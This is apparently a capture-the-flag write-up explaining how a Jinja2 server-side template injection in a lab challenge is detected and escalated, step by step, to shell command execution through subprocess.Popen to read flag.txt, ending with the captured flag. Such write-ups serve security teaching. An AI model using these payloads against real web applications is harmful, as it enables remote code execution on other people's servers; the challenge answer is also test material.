+++
title = 'Say Hello!'
date = '2024-09-05'
authors = ["Achintya J"]
+++

# Say Hello!

So, none of the common web exploitation techniques work here. There is nothing special in the HTTP requests, nothing in web directories or vhosts. At this point you should try out techniques like SSTI, XSS etc. Luckily for us, testing for `SSTI` gives results right away!

		test for SSTI using: {{}} --> gives error means, potential SSTI threat

useful link: https://portswigger.net/web-security/server-side-template-injection

Now that we know its SSTI, we want to understand what template engine is running this. This also we can test using prompts,

		template engine: Jinja2 (test using {{7*'7'}}, if it gives 7777777 then its Jinja2)

once we know the template engine, we can look for ways to exploit this specifically.

useful: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti

Going systematically,
once we have figured out that SSTI is possible in this, test out these things

1. `{{''.__class__}}` should return "str" or "string"
2. `{{''.__class__.mro()}}` should return "str" and "object". We therefore have access to the "object" class if we use something like `{{''.__class__.mro()[-1]}}`. This is amazing!

What we are looking for, is any way to get some function which we can use to read the flag which lies in the server. 

The main thing that stands out in stuff like this, is shell code execution. The thing therefore that we are looking for is a way to execute shell commands, just like using the "os" module in python. 

We can check all the subclasses available to us (not intentionally but since there is a SSTI vulnerability we can use that and see) using this

3. `{{''.__class__.mro()[-1].__subclasses__()}}`

This will return a lot of subclasses. We need to look for something called `<class 'subprocess.Popen'>`. This will allow us to use shell command and execute arbitrary code on the server! After running this command, locate this class and get its index. `For me, it was -12.`

4. `{{''.__class__.mro()[-1].__subclasses__()[-12]}}` gives the class subprocess.Popen. 

Now we can read the "flag.txt" file (this is something you can assume, that the flag's name is flag.txt) using the following command 

5. `{{''.__class__.mro()[1].__subclasses__()[-12]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}`. The additional parameters are as advocated by the link given above.

`flag: FLAG{Sh3n4n1g4ns!nject3d}`
